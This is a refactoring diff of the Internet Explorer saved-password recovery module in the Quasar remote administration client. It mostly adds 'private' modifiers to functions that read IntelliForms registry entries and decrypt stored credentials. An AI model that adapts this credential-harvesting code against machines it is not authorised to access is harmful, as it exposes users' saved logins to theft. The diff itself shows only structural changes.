@@ -1,6 +1,5 @@
 ﻿using Microsoft.Win32;
-using Quasar.Client.Helper;
-using Quasar.Common.Models;
+using Quasar.Common;
 using System;
 using System.Collections;
 using System.Collections.Generic;
@@ -68,7 +67,7 @@ namespace Quasar.Client.Recovery.Browsers
         #region Private Methods
         private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
 
-        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
+        private static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
             GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
             T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
@@ -76,7 +75,8 @@ namespace Quasar.Client.Recovery.Browsers
             return stuff;
 
         }
-        static bool DecryptIePassword(string url, List<string[]> dataList)
+
+        private static bool DecryptIePassword(string url, List<string[]> dataList)
         {
             byte[] cypherBytes;
 
@@ -162,7 +162,7 @@ namespace Quasar.Client.Recovery.Browsers
             return true;
         }
 
-        static bool DoesURLMatchWithHash(string urlHash)
+        private static bool DoesURLMatchWithHash(string urlHash)
         {
             // enumerate values of the target registry
             bool result = false;
@@ -177,7 +177,7 @@ namespace Quasar.Client.Recovery.Browsers
             return result;
         }
 
-        static string GetURLHashString(string wstrURL)
+        private static string GetURLHashString(string wstrURL)
         {
             IntPtr hProv = IntPtr.Zero;
             IntPtr hHash = IntPtr.Zero;
@@ -227,7 +227,7 @@ namespace Quasar.Client.Recovery.Browsers
         //
         //One Secret Info header specifying number of secret strings
         [StructLayout(LayoutKind.Sequential)]
-        struct IESecretInfoHeader
+        private struct IESecretInfoHeader
         {
 
             public uint dwIdHeader;     // value - 57 49 43 4B
@@ -241,7 +241,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         //Main Decrypted Autocomplete Header data
         [StructLayout(LayoutKind.Sequential)]
-        struct IEAutoComplteSecretHeader
+        private struct IEAutoComplteSecretHeader
         {
 
             public uint dwSize;                        //This header size
@@ -256,7 +256,7 @@ namespace Quasar.Client.Recovery.Browsers
         // Header describing each of the secrets such ass username/password.
         // Two secret entries having same SecretId are paired
         [StructLayout(LayoutKind.Explicit)]
-        struct SecretEntry
+        private struct SecretEntry
         {
 
             [FieldOffset(0)]
@@ -323,7 +323,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         [DllImport("advapi32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
+        private static extern bool CryptGetHashParam(IntPtr hHash, HashParameters dwParam, byte[] pbData, ref uint pdwDataLen, uint dwFlags);
 
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
